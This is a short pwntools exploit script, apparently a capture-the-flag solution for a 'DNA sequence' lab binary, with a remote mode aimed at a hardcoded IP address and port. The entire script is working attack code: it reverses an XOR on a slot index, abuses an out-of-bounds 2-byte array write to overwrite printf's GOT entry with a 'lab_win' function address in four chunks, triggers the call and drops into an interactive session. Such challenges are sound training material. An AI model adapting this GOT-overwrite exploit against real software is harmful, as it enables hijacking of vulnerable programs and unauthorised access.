from pwn import *
import sys

# Set context
context.binary = binary = ELF('./main')
context.log_level = 'info'

if args.REMOTE:
    host = args.HOST or '4.233.210.175'
    port = int(args.PORT or 9007)
    p = remote(host, port)
else:
    p = process('./main')

def get_menu():
    p.recvuntil(b'> ')

def write_val(idx, val):
    get_menu()
    p.sendline(b'1') # Modify DNA Sequence
    p.recvuntil(b'DNA Slot Index: ')
    # The Monkey Math: inverse the XOR to hit the target
    p.sendline(str(idx ^ 0x7050).encode())
    p.recvuntil(b'Base Pair Value: ')
    p.sendline(str(val).encode())
    p.recvuntil(b'[LAB]: DNA sequence updated successfully.\n')

def trigger():
    get_menu()
    p.sendline(b'2') # Synthesize Chemical X

# Exploit Logic
# 1. Target: printf@GOT
# 2. Value: lab_win() address
# 3. Primitive: 2-byte write via 'unsigned short' array

# Note: In the new main.c, global names are chemical_x and dna_sequences
got_printf = binary.got['printf']
sym_dna = binary.symbols['dna_sequences']
sym_win = binary.symbols['lab_win']

log.info(f"printf@GOT: {hex(got_printf)}")
log.info(f"dna_sequences: {hex(sym_dna)}")
log.info(f"lab_win: {hex(sym_win)}")

# Calculate start index
# dna_sequences + i * 2 = got_printf => i = (got_printf - dna_sequences) / 2
idx_start = (got_printf - sym_dna) // 2
log.info(f"Index start: {idx_start}")

chunks = [
    (sym_win >> 0) & 0xFFFF,
    (sym_win >> 16) & 0xFFFF,
    (sym_win >> 32) & 0xFFFF,
    (sym_win >> 48) & 0xFFFF
]

p.recvuntil(b'Input your Chemical X formula: ')
p.sendline(b"HELLO-MOJO") # Initial formula

for i, chunk in enumerate(chunks):
    log.info(f"Writing chunk {i}: {hex(chunk)} at idx {idx_start + i}")
    write_val(idx_start + i, chunk)

log.info("Triggering synthesized formula...")
trigger()

p.interactive()
